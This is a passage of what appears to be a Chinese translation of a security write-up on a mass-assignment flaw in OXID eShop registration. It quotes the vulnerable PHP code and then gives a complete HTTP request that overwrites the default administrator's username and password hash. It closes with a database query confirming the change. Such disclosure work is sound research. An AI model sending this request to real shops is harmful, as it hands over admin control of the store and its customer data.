            // 6. vat id check.
            $oInputValidator->checkVatId($this, $aInvAddress);
            // throwing first validation error
            if ($oError = oxRegistry::get("oxInputValidator")->getFirstValidationError()) {
                throw $oError;
            }
        }
`changeUserData`方法看起来更有意义。这段代码会再次调用`checkValues`，然后将`$aInvAddress`数组传递给`assign`方法：
    /**
         * When changing/updating user information in frontend this method validates user
         * input. If data is fine - automatically assigns this values. Additionally calls
         * methods (oxuser::_setAutoGroups, oxuser::setNewsSubscription) to perform automatic
         * groups assignment and returns newsletter subscription status. If some action
         * fails - exception is thrown.
         *
         * @param string $sUser       user login name
         * @param string $sPassword   user password
         * @param string $sPassword2  user confirmation password
         * @param array  $aInvAddress user billing address
         * @param array  $aDelAddress delivery address
         *
         * @throws oxUserException, oxInputException, oxConnectionException
         */
        public function changeUserData($sUser, $sPassword, $sPassword2, $aInvAddress, $aDelAddress)
        {
            // validating values before saving. If validation fails - exception is thrown
            $this->checkValues($sUser, $sPassword, $sPassword2, $aInvAddress, $aDelAddress);
            // input data is fine - lets save updated user info
            $this->assign($aInvAddress);
            // update old or add new delivery address
            $this->_assignAddress($aDelAddress);
            // saving new values
            if ($this->save()) {
                // assigning automatically to specific groups
                $sCountryId = isset($aInvAddress['oxuser__oxcountryid']) ? $aInvAddress['oxuser__oxcountryid'] : '';
                $this->_setAutoGroups($sCountryId);
            }
        }
`oxBase::assign`方法（如下所示）通过循环来遍历数组，并调用私有方法`_setFieldData`来更新每个数据库字段。这样处理可能会很危险，因为攻击者可以控制数组的键和值，允许他覆盖用户对象的任意字段，而不单单是来自地址的字段。
这基本上是一个“Mass Assignment”漏洞，在旧版本的Ruby on Rails中更加常见。
    /**
         * Assigns DB field values to object fields. Returns true on success.
         *
         * @param array $dbRecord Associative data values array
         *
         * @return null
         */
        public function assign( $dbRecord )
        {
            if ( !is_array( $dbRecord ) ) {
                return;
            }
            reset($dbRecord );
            while ( list( $sName, $sValue ) = each( $dbRecord ) ) {
                // patch for IIS
                //TODO: test it on IIS do we still need it
                //if( is_array($value) && count( $value) == 1)
                //    $value = current( $value);
                $this->_setFieldData( $sName, $sValue );
            }
            $sOxidField = $this->_getFieldLongName( 'oxid' );
            $this->_sOXID = $this->$sOxidField->value;
        }
向`invadr`数组添加其他字段，我们就可以在注册新帐户的期间覆盖oxuser数据库记录中的任意字段。修改不仅限于我们当前的用户，只要我们知道他们的主键（"oxid"），我们也可以覆盖其他帐户的数据。
首当其冲的第一个目标是默认管理员，因为此帐户的“oxid”始终是`oxdefaultadmin`。通过覆盖这个帐户的某些属性，例如用户名和密码哈希值，攻击者就可以破坏帐户并获得OXID商店的管理后端的访问权限。
# **开发**
以下HTTP请求展示了对漏洞的实际利用。我们注册了一个新帐户并将其他字段添加到“invadr”数组中。这应该允许我们覆盖默认管理员帐户的电子邮件地址：
但有点不幸，这似乎不起作用。看来OXID不知怎么地在抱怨我们的密码：
出现这个问题的原因是`checkValues`功能中的检查。该错误是由`checkValues()`调用的方法`checkLogin()`的代码造成的。事实证明，这个功能比“只检查”电子邮件地址要更复杂一些。实际上，我们尝试滥用的“bug”是OXID的一个特征。这就是为什么添加的清理功能不检查`oxuser_username`或`oxuser_oxpassword`的原因所在。
    public function checkLogin($oUser, $sLogin, $aInvAddress)
        {
            $sLogin = (isset($aInvAddress['oxuser__oxusername'])) ? $aInvAddress['oxuser__oxusername'] : $sLogin;
            // check only for users with password during registration
            // if user wants to change user name - we must check if passwords are ok before changing
            if ($oUser->oxuser__oxpassword->value && $sLogin != $oUser->oxuser__oxusername->value) {
                // on this case password must be taken directly from request
                $sNewPass = (isset($aInvAddress['oxuser__oxpassword']) && $aInvAddress['oxuser__oxpassword']) ? $aInvAddress['oxuser__oxpassword'] : oxRegistry::getConfig()->getRequestParameter('user_password');
                if (!$sNewPass) {
                    // 1. user forgot to enter password
                    $oEx = oxNew('oxInputException');
                    $oEx->setMessage(oxRegistry::getLang()->translateString('ERROR_MESSAGE_INPUT_NOTALLFIELDS'));
                    return $this->_addValidationError("oxuser__oxpassword", $oEx);
                } else {
                    // 2. entered wrong password
                    if (!$oUser->isSamePassword($sNewPass)) {
                        $oEx = oxNew('oxUserException');
                        $oEx->setMessage(oxRegistry::getLang()->translateString('ERROR_MESSAGE_PASSWORD_DO_NOT_MATCH'));
                        return $this->_addValidationError("oxuser__oxpassword", $oEx);
                    }
                }
            }
            if ($oUser->checkIfEmailExists($sLogin)) {
                //if exists then we do now allow to do that
                $oEx = oxNew('oxUserException');
                $oEx->setMessage(sprintf(oxRegistry::getLang()->translateString('ERROR_MESSAGE_USER_USEREXISTS'), $sLogin));
                return $this->_addValidationError("oxuser__oxusername", $oEx);
            }
            return $sLogin;
        }
当我们在`invAdr`数组中添加`oxuser__oxusername`键的值时，我们还必须提供密码（数组键`oxuser_password`）。然后用我们自己也可以提供的HTTP请求参数`user_password`来检查该字段的值。因此请求中的所有`password
fields`必须包含与值相同的哈希散列。
长话短说，我们可以覆盖默认管理员帐户的用户名和密码哈希值。这会将默认管理员的用户名更改为`PI:EMAIL`，密码为`hacked456`：
    POST /index.php?lang=1& HTTP/1.1
    Host: 10.165.188.125
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.165.188.125/index.php?lang=1&cl=register&fnc=logout&redirect=1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 1526
    Cookie: oxidadminlanguage=en; oxidadminprofile=0%40Standard%4010; language=1; sid=nht6r60vqs46cjkjpdn1t5n6a1; sid_key=oxid
    Connection: close
    Upgrade-Insecure-Requests: 1
    stoken=98BFFD11&lang=1&actcontrol=register&fnc=registeruser&cl=register&lgn_cook=0&reloadaddress=&option=3&lgn_usr=poc%40mogwailabs.de&lgn_pwd=990caf953cd3b566e11d8f3a02ae612fc6c96f9bb26e14cf93d129e66c0aefd425e4f3991eda97a21738548bd08dc72a3a10bc197c856e6ec42daaa68cf7e2cb&lgn_pwd2=990caf953cd3b566e11d8f3a02ae612fc6c96f9bb26e14cf93d129e66c0aefd425e4f3991eda97a21738548bd08dc72a3a10bc197c856e6ec42daaa68cf7e2cb&blnewssubscribed=0&invadr%5Boxuser__oxsal%5D=MR&invadr%5Boxuser__oxfname%5D=PoC&invadr%5Boxuser__oxlname%5D=PoC&invadr%5Boxuser__oxcompany%5D=&invadr%5Boxuser__oxaddinfo%5D=&invadr%5Boxuser__oxstreet%5D=Poc&invadr%5Boxuser__oxstreetnr%5D=123&invadr%5Boxuser__oxzip%5D=12345&invadr%5Boxuser__oxcity%5D=PoC&invadr%5Boxuser__oxustid%5D=&invadr%5Boxuser__oxcountryid%5D=a7c40f631fc920687.20179984&invadr%5Boxuser__oxstateid%5D=&invadr%5Boxuser__oxfon%5D=&invadr%5Boxuser__oxfax%5D=&invadr%5Boxuser__oxmobfon%5D=&invadr%5Boxuser__oxprivfon%5D=&invadr%5Boxuser__oxbirthdate%5D%5Bmonth%5D=&invadr%5Boxuser__oxbirthdate%5D%5Bday%5D=&invadr%5Boxuser__oxbirthdate%5D%5Byear%5D=&save=&invadr[oxuser__oxid]=oxdefaultadmin&invadr[oxuser__oxusername]=PI:EMAIL&invadr[oxuser__oxpasssalt]=49a9a9a9a4fc191cba6cec03bb65bad3&invadr[oxuser__oxpassword]=990caf953cd3b566e11d8f3a02ae612fc6c96f9bb26e14cf93d129e66c0aefd425e4f3991eda97a21738548bd08dc72a3a10bc197c856e6ec42daaa68cf7e2cb&user_password=990caf953cd3b566e11d8f3a02ae612fc6c96f9bb26e14cf93d129e66c0aefd425e4f3991eda97a21738548bd08dc72a3a10bc197c856e6ec42daaa68cf7e2cb
您可以检查数据库条目以验证是否成功地利用了漏洞。当然，您也可以登录OXID管理员后端（/admin）。
    mysql> select oxid, oxusername from oxuser where oxid='oxdefaultadmin';
    +----------------+----------------------+
    | oxid           | oxusername           |
    +----------------+----------------------+
    | oxdefaultadmin | PI:EMAIL |
    +----------------+----------------------+
    1 row in set (0.00 sec)